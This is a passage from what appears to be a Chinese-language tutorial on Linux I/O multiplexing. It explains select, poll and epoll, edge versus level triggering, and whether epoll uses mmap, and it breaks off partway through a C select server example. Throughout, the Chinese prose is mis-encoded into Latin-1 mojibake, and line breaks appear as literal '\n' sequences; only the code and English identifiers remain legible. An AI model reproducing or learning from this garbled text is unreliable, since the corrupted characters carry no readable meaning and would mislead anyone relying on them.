å¯è¯»ã€å¯å†™ã€æˆ–è€…æœ‰å¼‚å¸¸ï¼‰ï¼Œæˆ–è€…è¶…æ—¶ï¼ˆtimeoutæŒ‡å®šç­‰å¾…æ—¶é—´ï¼Œå¦‚æœç«‹å³è¿”å›è®¾ä¸ºnullå³å¯ï¼‰ï¼Œå‡½æ•°è¿”å›ã€‚å½“selectå‡½æ•°è¿”å›åï¼Œå¯ä»¥ é€šè¿‡éå†fdsetï¼Œæ¥æ‰¾åˆ°å°±ç»ªçš„æè¿°ç¬¦ã€‚\n\n\n\né¦–å…ˆä¸€ä¸ªçº¿ç¨‹ä¸æ–­æ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œå¹¶æŠŠ socket æ–‡ä»¶æè¿°ç¬¦æ”¾åˆ°ä¸€ä¸ª list é‡Œã€‚\n\n```text\nwhile(1) {\n  connfd = accept(listenfd);\n  fcntl(connfd, F_SETFL, O_NONBLOCK);\n  fdlist.add(connfd);\n}\n```\n\nç„¶åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä¸å†è‡ªå·±éå†ï¼Œè€Œæ˜¯è°ƒç”¨ selectï¼Œå°†è¿™æ‰¹æ–‡ä»¶æè¿°ç¬¦ list äº¤ç»™æ“ä½œç³»ç»Ÿå»éå†ã€‚\n\n```text\nwhile(1) {\n  // æŠŠä¸€å †æ–‡ä»¶æè¿°ç¬¦ list ä¼ ç»™ select å‡½æ•°\n  // æœ‰å·²å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦å°±è¿”å›ï¼Œnready è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå°±ç»ªçš„\n  nready = select(list);\n  ...\n}\n```\n\nåªä¸è¿‡ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†å‡†å¤‡å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦åšä¸Šæ ‡è¯†ï¼Œç”¨æˆ·å±‚å°†ä¸ä¼šå†æœ‰æ— æ„ä¹‰çš„ç³»ç»Ÿè°ƒç”¨å¼€é”€ã€‚\n\n```text\nwhile(1) {\n  nready = select(list);\n  // ç”¨æˆ·å±‚ä¾ç„¶è¦éå†ï¼Œåªä¸è¿‡å°‘äº†å¾ˆå¤šæ— æ•ˆçš„ç³»ç»Ÿè°ƒç”¨\n  for(fd <-- fdlist) {\n    if(fd != -1) {\n      // åªè¯»å·²å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦\n      read(fd, buf);\n      // æ€»å…±åªæœ‰ nready ä¸ªå·²å°±ç»ªæè¿°ç¬¦ï¼Œä¸ç”¨è¿‡å¤šéå†\n      if(--nready == 0) break;\n    }\n  }\n}\n```\n\n![img](ioå¤šè·¯å¤ç”¨select_poll_epoll/v2-320be0c91e2a376199b1d5eef626758e_720w.gif)\n\nå¯ä»¥çœ‹å‡ºå‡ ä¸ªç»†èŠ‚ï¼š\n\n1. select è°ƒç”¨éœ€è¦ä¼ å…¥ fd æ•°ç»„ï¼Œéœ€è¦æ‹·è´ä¸€ä»½åˆ°å†…æ ¸ï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹è¿™æ ·çš„æ‹·è´æ¶ˆè€—çš„èµ„æºæ˜¯æƒŠäººçš„ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºä¸å¤åˆ¶ï¼‰\n2. select åœ¨å†…æ ¸å±‚ä»ç„¶æ˜¯é€šè¿‡éå†çš„æ–¹å¼æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦çš„å°±ç»ªçŠ¶æ€ï¼Œæ˜¯ä¸ªåŒæ­¥è¿‡ç¨‹ï¼Œåªä¸è¿‡æ— ç³»ç»Ÿè°ƒç”¨åˆ‡æ¢ä¸Šä¸‹æ–‡çš„å¼€é”€ã€‚ï¼ˆå†…æ ¸å±‚å¯ä¼˜åŒ–ä¸ºå¼‚æ­¥äº‹ä»¶é€šçŸ¥ï¼‰\n3. select ä»…ä»…è¿”å›å¯è¯»æ–‡ä»¶æè¿°ç¬¦çš„ä¸ªæ•°ï¼Œå…·ä½“å“ªä¸ªå¯è¯»è¿˜æ˜¯è¦ç”¨æˆ·è‡ªå·±éå†ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºåªè¿”å›ç»™ç”¨æˆ·å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ— éœ€ç”¨æˆ·åšæ— æ•ˆçš„éå†ï¼‰\n4. å¦å¤–select è¿˜æœ‰1024çš„é™åˆ¶ã€‚\n\n\n\n<img src=\"ioå¤šè·¯å¤ç”¨select_poll_epoll/v2-6d9944887990eaf8714438351a196301_720w.jpg\" alt=\"img\" style=\"zoom:70%;\" />\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ–¹å¼ï¼Œæ—¢åšåˆ°äº†ä¸€ä¸ªçº¿ç¨‹å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œåˆå‡å°‘äº†ç³»ç»Ÿè°ƒç”¨çš„å¼€é”€ï¼ˆå¤šä¸ªæ–‡ä»¶æè¿°ç¬¦åªæœ‰ä¸€æ¬¡ select çš„ç³»ç»Ÿè°ƒç”¨ + n æ¬¡å°±ç»ªçŠ¶æ€çš„æ–‡ä»¶æè¿°ç¬¦çš„ read ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚\n\n### 2.2 poll \n\n> åªè§£é™¤äº†select æ•°é‡1024çš„é™åˆ¶\n\n\n\n```c\nint poll(struct pollfd *fds, nfds_tnfds, int timeout);\n\n\n\nstruct pollfd {\n  intfd; /*æ–‡ä»¶æè¿°ç¬¦*/\n  shortevents; /*ç›‘æ§çš„äº‹ä»¶*/\n  shortrevents; /*ç›‘æ§äº‹ä»¶ä¸­æ»¡è¶³æ¡ä»¶è¿”å›çš„äº‹ä»¶*/\n};\n```\n\n\n\npollå’Œselectéå¸¸ç›¸ä¼¼ï¼Œpollå¹¶æ²¡ç€æ‰‹è§£å†³æ€§èƒ½é—®é¢˜ï¼Œpollåªæ˜¯è§£å†³äº†selectçš„é—®é¢˜ fdsé›†åˆå¤§å°1024é™åˆ¶é—®é¢˜ã€‚æ‰€ä»¥æ˜¯ä¸ªé¸¡è‚‹ã€‚\n\n\n\n### 2.3 epoll\n\n> ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ + å†…æ ¸å±‚éå†è¿™äº›æ–‡ä»¶æè¿°ç¬¦\n\n\n\nè¿˜è®°å¾—ä¸Šé¢è¯´çš„ select çš„ä¸‰ä¸ªç»†èŠ‚ä¹ˆï¼Ÿ\n\n1. select è°ƒç”¨éœ€è¦ä¼ å…¥ fd æ•°ç»„ï¼Œéœ€è¦æ‹·è´ä¸€ä»½åˆ°å†…æ ¸ï¼Œé«˜å¹¶å‘åœºæ™¯ä¸‹è¿™æ ·çš„æ‹·è´æ¶ˆè€—çš„èµ„æºæ˜¯æƒŠäººçš„ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºä¸å¤åˆ¶ï¼‰\n2. select åœ¨å†…æ ¸å±‚ä»ç„¶æ˜¯é€šè¿‡éå†çš„æ–¹å¼æ£€æŸ¥æ–‡ä»¶æè¿°ç¬¦çš„å°±ç»ªçŠ¶æ€ï¼Œæ˜¯ä¸ªåŒæ­¥è¿‡ç¨‹ï¼Œåªä¸è¿‡æ— ç³»ç»Ÿè°ƒç”¨åˆ‡æ¢ä¸Šä¸‹æ–‡çš„å¼€é”€ã€‚ï¼ˆå†…æ ¸å±‚å¯ä¼˜åŒ–ä¸ºå¼‚æ­¥äº‹ä»¶é€šçŸ¥ï¼‰\n3. select ä»…ä»…è¿”å›å¯è¯»æ–‡ä»¶æè¿°ç¬¦çš„ä¸ªæ•°ï¼Œå…·ä½“å“ªä¸ªå¯è¯»è¿˜æ˜¯è¦ç”¨æˆ·è‡ªå·±éå†ã€‚ï¼ˆå¯ä¼˜åŒ–ä¸ºåªè¿”å›ç»™ç”¨æˆ·å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ— éœ€ç”¨æˆ·åšæ— æ•ˆçš„éå†ï¼‰\n\n\n\næ‰€ä»¥ epoll ä¸»è¦å°±æ˜¯é’ˆå¯¹è¿™ä¸‰ç‚¹è¿›è¡Œäº†æ”¹è¿›ã€‚\n\n1. å†…æ ¸ä¸­ä¿å­˜ä¸€ä»½æ–‡ä»¶æè¿°ç¬¦é›†åˆï¼Œæ— éœ€ç”¨æˆ·æ¯æ¬¡éƒ½é‡æ–°ä¼ å…¥ï¼Œåªéœ€å‘Šè¯‰å†…æ ¸ä¿®æ”¹çš„éƒ¨åˆ†å³å¯ã€‚\n2. å†…æ ¸ä¸å†é€šè¿‡è½®è¯¢çš„æ–¹å¼æ‰¾åˆ°å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ˜¯é€šè¿‡å¼‚æ­¥ IO äº‹ä»¶å”¤é†’ã€‚\n3. å†…æ ¸ä»…ä¼šå°†æœ‰ IO äº‹ä»¶çš„æ–‡ä»¶æè¿°ç¬¦è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ä¹Ÿæ— éœ€éå†æ•´ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†åˆã€‚\n\n\n\nå…·ä½“ï¼Œæ“ä½œç³»ç»Ÿæä¾›äº†è¿™ä¸‰ä¸ªå‡½æ•°ã€‚\n\n<img src=\"ioå¤šè·¯å¤ç”¨select_poll_epoll/epoll.png\" alt=\"img\" style=\"zoom:67%;\" />\n\n##### ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºä¸€ä¸ª epoll å¥æŸ„\n\n```c\nint epoll_create(int size);\n```\n\nsizeç”¨æ¥å‘Šè¯‰å†…æ ¸è¿™ä¸ªç›‘å¬çš„æ•°ç›®ä¸€å…±æœ‰å¤šå¤§ã€‚æ–°ç‰ˆæœ¬ç”¨çº¢é»‘æ ‘ï¼Œè¿™ä¸ªå‚æ•°æ„ä¹‰ä¸å¤§äº†ã€‚\n\n\n\n##### ç¬¬äºŒæ­¥ï¼Œå‘å†…æ ¸æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤è¦ç›‘æ§çš„æ–‡ä»¶æè¿°ç¬¦ã€‚\n\n```c\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n```\n\n+ epfdï¼šæ˜¯epoll_create()çš„è¿”å›å€¼ã€‚\n\n+ opï¼šè¡¨ç¤ºopæ“ä½œï¼Œåˆ†åˆ«æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹å¯¹fdçš„ç›‘å¬äº‹ä»¶ã€‚\n\n  + æ·»åŠ EPOLL_CTL_ADDï¼Œ\n  + åˆ é™¤EPOLL_CTL_DELï¼Œ\n  + ä¿®æ”¹EPOLL_CTL_MODã€‚\n\n+ fdï¼šæ˜¯éœ€è¦ç›‘å¬çš„fdï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰\n\n+ epoll_eventï¼šæ˜¯å‘Šè¯‰å†…æ ¸éœ€è¦ç›‘å¬ä»€ä¹ˆäº‹ï¼Œstruct epoll_eventç»“æ„å¦‚ä¸‹ï¼š\n\n  ```c\n  struct epoll_event {\n    __uint32_t events;  /* Epoll events */\n    epoll_data_t data;  /* User data variable */\n  };\n  ```\n\n  eventså¯ä»¥æ˜¯ä»¥ä¸‹å‡ ä¸ªå®çš„é›†åˆï¼š\n\n  + EPOLLIN ï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥è¯»ï¼ˆåŒ…æ‹¬å¯¹ç«¯SOCKETæ­£å¸¸å…³é—­ï¼‰ï¼›\n  + EPOLLOUTï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å¯ä»¥å†™ï¼›\n  + EPOLLPRIï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æœ‰ç´§æ€¥çš„æ•°æ®å¯è¯»ï¼ˆè¿™é‡Œåº”è¯¥è¡¨ç¤ºæœ‰å¸¦å¤–æ•°æ®åˆ°æ¥ï¼‰ï¼›\n  + EPOLLERRï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å‘ç”Ÿé”™è¯¯ï¼›\n  + EPOLLHUPï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦è¢«æŒ‚æ–­ï¼›\n  + EPOLLETï¼š å°†EPOLLè®¾ä¸ºè¾¹ç¼˜è§¦å‘(Edge Triggered)æ¨¡å¼ï¼Œè¿™æ˜¯ç›¸å¯¹äºæ°´å¹³è§¦å‘(Level Triggered)æ¥è¯´çš„ã€‚\n  + EPOLLONESHOTï¼šåªç›‘å¬ä¸€æ¬¡äº‹ä»¶ï¼Œå½“ç›‘å¬å®Œè¿™æ¬¡äº‹ä»¶ä¹‹åï¼Œå¦‚æœè¿˜éœ€è¦ç»§ç»­ç›‘å¬è¿™ä¸ªsocketçš„è¯ï¼Œéœ€è¦å†æ¬¡æŠŠè¿™ä¸ªsocketåŠ å…¥åˆ°EPOLLé˜Ÿåˆ—é‡Œ\n\n\n\n##### ç¬¬ä¸‰æ­¥ï¼Œepoll_wait è°ƒç”¨\n\n```c\nint epoll_wait(int epfd, struct epoll_event *events, int max events, int timeout);\n```\n\n![img](ioå¤šè·¯å¤ç”¨select_poll_epoll/v2-70f8e9bc1a028d252c01c32329e49341_720w.gif)\n\nç­‰å¾…epfdä¸Šçš„ioäº‹ä»¶ï¼Œæœ€å¤šè¿”å›maxeventsä¸ªäº‹ä»¶ã€‚\n\nå‚æ•°eventsç”¨æ¥ä»å†…æ ¸å¾—åˆ°äº‹ä»¶çš„é›†åˆï¼Œmaxeventså‘Šä¹‹å†…æ ¸è¿™ä¸ªeventsæœ‰å¤šå¤§ï¼Œè¿™ä¸ªmaxeventsçš„å€¼ä¸èƒ½å¤§äºåˆ›å»ºepoll_create()æ—¶çš„size\n\nå‚æ•°timeoutæ˜¯è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼Œ0ä¼šç«‹å³è¿”å›ï¼Œ-1å°†ä¸ç¡®å®šï¼Œä¹Ÿæœ‰è¯´æ³•è¯´æ˜¯æ°¸ä¹…é˜»å¡ï¼‰ã€‚\n\nè¯¥å‡½æ•°è¿”å›éœ€è¦å¤„ç†çš„äº‹ä»¶æ•°ç›®ï¼Œå¦‚è¿”å›0è¡¨ç¤ºå·²è¶…æ—¶ã€‚\n\n\n\n# 3. ä¸ºä»€ä¹ˆæœ‰ epoll\n\n### 3.1 io çš„æ¼”å˜\n\nä¸€åˆ‡çš„å¼€å§‹ï¼Œéƒ½èµ·æºäºè¿™ä¸ª read å‡½æ•°æ˜¯æ“ä½œç³»ç»Ÿæä¾›çš„ï¼Œè€Œä¸”æ˜¯é˜»å¡çš„ï¼Œæˆ‘ä»¬å«å®ƒ **é˜»å¡ IO**ã€‚\n\nä¸ºäº†ç ´è¿™ä¸ªå±€ï¼Œç¨‹åºå‘˜åœ¨ç”¨æˆ·æ€é€šè¿‡å¤šçº¿ç¨‹æ¥é˜²æ­¢ä¸»çº¿ç¨‹å¡æ­»ã€‚\n\nåæ¥æ“ä½œç³»ç»Ÿå‘ç°è¿™ä¸ªéœ€æ±‚æ¯”è¾ƒå¤§ï¼Œäºæ˜¯åœ¨æ“ä½œç³»ç»Ÿå±‚é¢æä¾›äº†éé˜»å¡çš„ read å‡½æ•°ï¼Œè¿™æ ·ç¨‹åºå‘˜å°±å¯ä»¥åœ¨ä¸€ä¸ªçº¿ç¨‹å†…å®Œæˆå¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„è¯»å–ï¼Œè¿™å°±æ˜¯ **éé˜»å¡ IO**ã€‚\n\nä½†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„è¯»å–å°±éœ€è¦éå†ï¼Œå½“é«˜å¹¶å‘åœºæ™¯è¶Šæ¥è¶Šå¤šæ—¶ï¼Œç”¨æˆ·æ€éå†çš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿè¶Šæ¥è¶Šå¤šï¼Œç›¸å½“äºåœ¨ while å¾ªç¯é‡Œè¿›è¡Œäº†è¶Šæ¥è¶Šå¤šçš„ç³»ç»Ÿè°ƒç”¨ã€‚\n\nåæ¥æ“ä½œç³»ç»Ÿåˆå‘ç°è¿™ä¸ªåœºæ™¯éœ€æ±‚é‡è¾ƒå¤§ï¼Œäºæ˜¯åˆåœ¨æ“ä½œç³»ç»Ÿå±‚é¢æä¾›äº†è¿™æ ·çš„éå†æ–‡ä»¶æè¿°ç¬¦çš„æœºåˆ¶ï¼Œè¿™å°±æ˜¯ **IO å¤šè·¯å¤ç”¨**ã€‚\n\nå¤šè·¯å¤ç”¨æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œæœ€å¼€å§‹æ˜¯ selectï¼Œç„¶ååˆå‘æ˜äº† poll è§£å†³äº† select æ–‡ä»¶æè¿°ç¬¦çš„é™åˆ¶ï¼Œç„¶ååˆå‘æ˜äº† epoll è§£å†³ select çš„ä¸‰ä¸ªä¸è¶³ã€‚\n\n### 3.2  epollçš„æ„ä¹‰\n\næ‰€ä»¥ï¼ŒIO æ¨¡å‹çš„æ¼”è¿›ï¼Œå…¶å®å°±æ˜¯æ—¶ä»£çš„å˜åŒ–ï¼Œå€’é€¼ç€æ“ä½œç³»ç»Ÿå°†æ›´å¤šçš„åŠŸèƒ½åŠ åˆ°è‡ªå·±çš„å†…æ ¸è€Œå·²ã€‚å¦‚æœä½ å»ºç«‹äº†è¿™æ ·çš„æ€ç»´ï¼Œå¾ˆå®¹æ˜“å‘ç°ç½‘ä¸Šçš„ä¸€äº›é”™è¯¯ã€‚\n\næ¯”å¦‚å¥½å¤šæ–‡ç« è¯´ï¼Œå¤šè·¯å¤ç”¨ä¹‹æ‰€ä»¥æ•ˆç‡é«˜ï¼Œæ˜¯å› ä¸ºç”¨ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥ç›‘æ§å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚\n\nè¿™æ˜¾ç„¶æ˜¯çŸ¥å…¶ç„¶è€Œä¸çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œå¤šè·¯å¤ç”¨äº§ç”Ÿçš„æ•ˆæœï¼Œå®Œå…¨å¯ä»¥ç”±ç”¨æˆ·æ€å»éå†æ–‡ä»¶æè¿°ç¬¦å¹¶è°ƒç”¨å…¶éé˜»å¡çš„ read å‡½æ•°å®ç°ã€‚è€Œå¤šè·¯å¤ç”¨å¿«çš„åŸå› åœ¨äºï¼Œæ“ä½œç³»ç»Ÿæä¾›äº†è¿™æ ·çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä½¿å¾—åŸæ¥çš„ while å¾ªç¯é‡Œå¤šæ¬¡ç³»ç»Ÿè°ƒç”¨ï¼Œå˜æˆäº†ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ + å†…æ ¸å±‚éå†è¿™äº›æ–‡ä»¶æè¿°ç¬¦ã€‚\n\nå°±å¥½æ¯”æˆ‘ä»¬å¹³æ—¶å†™ä¸šåŠ¡ä»£ç ï¼ŒæŠŠåŸæ¥ while å¾ªç¯é‡Œè°ƒ http æ¥å£è¿›è¡Œæ‰¹é‡ï¼Œæ”¹æˆäº†è®©å¯¹æ–¹æä¾›ä¸€ä¸ªæ‰¹é‡æ·»åŠ çš„ http æ¥å£ï¼Œç„¶åæˆ‘ä»¬ä¸€æ¬¡ rpc è¯·æ±‚å°±å®Œæˆäº†æ‰¹é‡æ·»åŠ ä¸€ä¸ªé“ç†ã€‚\n\n### 3.3  epollä½¿ç”¨äº†mmapäº†å—\n\nä¸å°‘åšå®¢ä¸­æåˆ°ï¼Œepoll_waitè¿”å›æ—¶ï¼Œå¯¹äºå°±ç»ªçš„äº‹ä»¶ï¼Œepollä½¿ç”¨çš„æ˜¯å…±äº«å†…å­˜çš„æ–¹å¼ï¼Œå³ç”¨æˆ·æ€å’Œå†…æ ¸æ€éƒ½æŒ‡å‘äº†å°±ç»ªé“¾è¡¨ï¼Œæ‰€ä»¥å°±é¿å…äº†å†…å­˜æ‹·è´æ¶ˆè€—ã€‚\n\nè¿™æ˜¯é”™çš„ï¼çœ‹è¿‡ epoll å†…æ ¸æºç çš„éƒ½çŸ¥é“ï¼Œ**å‹æ ¹å°±æ²¡æœ‰ä½¿ç”¨å…±äº«å†…å­˜è¿™ä¸ªç©æ„**ã€‚ä½ å¯ä»¥ä»ä¸‹é¢è¿™ä»½ä»£ç çœ‹åˆ°ï¼Œ epoll_wait å®ç°çš„å†…æ ¸ä»£ç ä¸­è°ƒç”¨äº† `__put_user` å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯å°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚\n\n<img src=\"ioå¤šè·¯å¤ç”¨select_poll_epoll/epoll_mmap.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 3.4 epoll è¾¹ç¼˜è§¦å‘(ET)å’Œæ°´å¹³è§¦å‘(LT)\n\nepoll æ”¯æŒä¸¤ç§äº‹ä»¶è§¦å‘æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯è¾¹ç¼˜è§¦å‘ï¼ˆedge-triggeredï¼ŒETï¼‰å’Œæ°´å¹³è§¦å‘ï¼ˆlevel-triggeredï¼ŒLTï¼‰ã€‚epoll é»˜è®¤çš„è§¦å‘æ¨¡å¼æ˜¯æ°´å¹³è§¦å‘ã€‚\n\n\n\nä½¿ç”¨è¾¹ç¼˜è§¦å‘æ¨¡å¼æ—¶ï¼Œå½“è¢«ç›‘æ§çš„ Socket æè¿°ç¬¦ä¸Šæœ‰å¯è¯»äº‹ä»¶å‘ç”Ÿæ—¶ï¼ŒæœåŠ¡å™¨ç«¯åªä¼šä» epoll_wait ä¸­è‹é†’ä¸€æ¬¡ï¼Œå³ä½¿è¿›ç¨‹æ²¡æœ‰è°ƒç”¨ read å‡½æ•°ä»å†…æ ¸è¯»å–æ•°æ®ï¼Œä¹Ÿä¾ç„¶åªè‹é†’ä¸€æ¬¡ï¼Œå› æ­¤æˆ‘ä»¬ç¨‹åºè¦ä¿è¯ä¸€æ¬¡æ€§å°†å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®è¯»å–å®Œï¼›\n\nä½¿ç”¨æ°´å¹³è§¦å‘æ¨¡å¼æ—¶ï¼Œå½“è¢«ç›‘æ§çš„ Socket ä¸Šæœ‰å¯è¯»äº‹ä»¶å‘ç”Ÿæ—¶ï¼ŒæœåŠ¡å™¨ç«¯ä¸æ–­åœ°ä» epoll_wait ä¸­è‹é†’ï¼Œç›´åˆ°å†…æ ¸ç¼“å†²åŒºæ•°æ®è¢« read å‡½æ•°è¯»å®Œæ‰ç»“æŸï¼Œç›®çš„æ˜¯å‘Šè¯‰æˆ‘ä»¬æœ‰æ•°æ®éœ€è¦è¯»å–ï¼›\n\n\n\næ°´å¹³è§¦å‘çš„æ„æ€æ˜¯åªè¦æ»¡è¶³äº‹ä»¶çš„æ¡ä»¶ï¼Œæ¯”å¦‚å†…æ ¸ä¸­æœ‰æ•°æ®éœ€è¦è¯»ï¼Œå°±ä¸€ç›´ä¸æ–­åœ°æŠŠè¿™ä¸ªäº‹ä»¶ä¼ é€’ç»™ç”¨æˆ·ï¼›è€Œè¾¹ç¼˜è§¦å‘çš„æ„æ€æ˜¯åªæœ‰ç¬¬ä¸€æ¬¡æ»¡è¶³æ¡ä»¶çš„æ—¶å€™æ‰è§¦å‘ï¼Œä¹‹åå°±ä¸ä¼šå†ä¼ é€’åŒæ ·çš„äº‹ä»¶äº†ã€‚\n\n\n\nå¦‚æœä½¿ç”¨è¾¹ç¼˜è§¦å‘æ¨¡å¼ï¼ŒI/O äº‹ä»¶å‘ç”Ÿæ—¶åªä¼šé€šçŸ¥ä¸€æ¬¡ï¼Œè€Œä¸”æˆ‘ä»¬ä¸çŸ¥é“åˆ°åº•èƒ½è¯»å†™å¤šå°‘æ•°æ®ï¼Œæ‰€ä»¥åœ¨æ”¶åˆ°é€šçŸ¥ååº”å°½å¯èƒ½åœ°è¯»å†™æ•°æ®ï¼Œä»¥å…é”™å¤±è¯»å†™çš„æœºä¼šã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¼šå¾ªç¯ä»æ–‡ä»¶æè¿°ç¬¦è¯»å†™æ•°æ®ï¼Œé‚£ä¹ˆå¦‚æœæ–‡ä»¶æè¿°ç¬¦æ˜¯é˜»å¡çš„ï¼Œæ²¡æœ‰æ•°æ®å¯è¯»å†™æ—¶ï¼Œè¿›ç¨‹ä¼šé˜»å¡åœ¨è¯»å†™å‡½æ•°é‚£é‡Œï¼Œç¨‹åºå°±æ²¡åŠæ³•ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œ**è¾¹ç¼˜è§¦å‘æ¨¡å¼ä¸€èˆ¬å’Œéé˜»å¡ I/O æ­é…ä½¿ç”¨**ï¼Œç¨‹åºä¼šä¸€ç›´æ‰§è¡Œ I/O æ“ä½œï¼Œç›´åˆ°ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ read å’Œ writeï¼‰è¿”å›é”™è¯¯ï¼Œé”™è¯¯ç±»å‹ä¸º EAGAIN æˆ– EWOULDBLOCKã€‚\n\nä¸€èˆ¬æ¥è¯´ï¼Œè¾¹ç¼˜è§¦å‘çš„æ•ˆç‡æ¯”æ°´å¹³è§¦å‘çš„æ•ˆç‡è¦é«˜ï¼Œå› ä¸ºè¾¹ç¼˜è§¦å‘å¯ä»¥å‡å°‘ epoll_wait çš„ç³»ç»Ÿè°ƒç”¨æ¬¡æ•°ï¼Œç³»ç»Ÿè°ƒç”¨ä¹Ÿæ˜¯æœ‰ä¸€å®šçš„å¼€é”€çš„çš„ï¼Œæ¯•ç«Ÿä¹Ÿå­˜åœ¨ä¸Šä¸‹æ–‡çš„åˆ‡æ¢ã€‚\n\nselect/poll åªæœ‰æ°´å¹³è§¦å‘æ¨¡å¼ï¼Œepoll é»˜è®¤çš„è§¦å‘æ¨¡å¼æ˜¯æ°´å¹³è§¦å‘ï¼Œä½†æ˜¯å¯ä»¥æ ¹æ®åº”ç”¨åœºæ™¯è®¾ç½®ä¸ºè¾¹ç¼˜è§¦å‘æ¨¡å¼ã€‚\n\n### \n\n# 4. ä»£ç \n\n### 4.1 select\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\n  int opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\tint clients[FD_SETSIZE]; \n\tfor (int i = 0; i < FD_SETSIZE; ++i) {\n\t\tclients[i] = -1;\n\t}\n\tfd_set rset, allset;\n\tFD_ZERO(&allset);\n\tFD_SET(server_id, &allset);\n\tint maxfd = server_id;\n\tint maxi = -1;\n\n\twhile (1) {\n\t\trset = allset;\n    // åªç›‘å¬è¯»æè¿°ç¬¦\n\t\tint iready = select(maxfd+1, &rset, NULL, NULL, NULL);\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"select error\");\n\t\t}\n\n\t\tif (FD_ISSET(server_id, &rset)) {\n\t\t\t// è¯´æ˜æœ‰æ–°çš„ client å†™\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\t\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 0;\n\t\t\tfor (; i < FD_SETSIZE; ++i) {\n\t\t\t\tif (clients[i] < 0) {\n\t\t\t\t\tclients[i] = client_id;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == FD_SETSIZE) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tFD_SET(client_id, &allset);\n\t\t\tif (client_id > maxfd) {\n\t\t\t\tmaxfd = client_id;\n\t\t\t}\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 0; i <= maxi; ++i) {\n\t\t\tint fd = clients[i];\n\t\t\tif (fd < 0) {\n\t\t\t\tcontinue;\t\n\t\t\t}\n\t\t\tif (FD_ISSET(fd, &rset)) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\n\t\t\t\t\tFD_CLR(fd, 